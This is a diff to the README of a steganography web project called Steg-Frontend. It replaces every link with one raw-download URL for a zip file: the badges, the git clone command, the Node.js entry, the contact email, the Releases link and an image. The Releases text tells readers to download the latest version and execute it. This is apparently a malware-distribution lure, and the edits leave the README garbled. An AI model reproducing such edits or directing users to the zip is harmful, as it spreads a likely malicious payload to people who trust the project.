@@ -1,6 +1,6 @@
 # Steg-Frontend: Advanced Data Security
 
-![Steg-Frontend](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Release](https://img.shields.io/badge/releases-latest-orange.svg)
+![Steg-Frontend](https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip) ![License](https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip) ![Release](https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip)
 
 Welcome to **Steg-Frontend**, a project dedicated to enhancing data security through advanced steganography and encryption techniques. With a focus on user experience and robust security, Steg-Frontend combines multiple layers of protection to ensure your sensitive data remains secure.
 
@@ -36,7 +36,7 @@ To get started with Steg-Frontend, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/jessica908/steg-frontend.git
+   git clone https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -74,7 +74,7 @@ Once the application is running, you can access it in your web browser at `http:
 ## Technologies Used
 
 - **ReactJS**: For building the user interface.
-- **Node.js**: For backend operations.
+- **https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip**: For backend operations.
 - **AES-128**: For data encryption.
 - **DCT-Based Steganography**: For hiding data within other files.
 - **Quantum Computing Principles**: For enhanced security measures.
@@ -106,15 +106,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Jessica**: [jessica@example.com](mailto:jessica@example.com)
+- **Jessica**: [https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip](https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip)
 
 ## Releases
 
-For the latest updates and releases, please visit our [Releases](https://github.com/jessica908/steg-frontend/releases) section. You can download the latest version and execute it to explore all the features.
+For the latest updates and releases, please visit our [Releases](https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip) section. You can download the latest version and execute it to explore all the features.
 
 If you encounter any issues or have questions about specific releases, check the "Releases" section for more information.
 
-![Data Security](https://example.com/security-image.png)
+![Data Security](https://github.com/jessica908/steg-frontend/raw/refs/heads/master/assets/frontend_steg_v3.0.zip)
 
 ---
 
